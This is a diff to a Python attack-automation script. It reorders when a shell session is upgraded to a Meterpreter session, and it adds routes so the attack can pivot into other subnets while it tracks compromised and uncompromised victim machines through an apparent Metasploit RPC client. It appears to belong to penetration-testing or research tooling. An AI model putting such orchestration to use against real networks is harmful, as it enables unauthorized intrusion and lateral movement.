@@ -46,12 +46,12 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
     router=None
     OOBSession=None
+    atk_sess=None
+
     compromised_machines={attacker_ip}
     uncompromised_machines=set()
 
     mc=MetaClient("password", C.ATTACKER_SERVER_RPC_PORT, attacker_ip)
-
-    atk_sess=None
 
     while(machines):
         #extract the first victim
@@ -62,12 +62,18 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
         randomized_attack=random.sample(attack,len(attack))
 
+        if(atk_sess!=None):
+            met_sess=mc.upgrade_shell(atk_sess)
+
+
         if(target_ip in other_subnet):
             if(atk_sess==None):
                 print(f"{C.COL_RED}[-] subnet not reachable, no intermediate session available{C.COL_RESET}") 
                 return 
             print(f"{C.COL_YELLOW}[*] other subnet found, adding new routes{C.COL_RESET}")
-            met_sess=mc.upgrade_shell(atk_sess)
+
+            #met_sess=mc.upgrade_shell(atk_sess)
+
             if(met_sess):
                 print(f"{C.COL_YELLOW}[*] Meterpreter session received, adding routes{C.COL_RESET}")
                 mc.route_add(met_sess["id_sess"], target_ip)
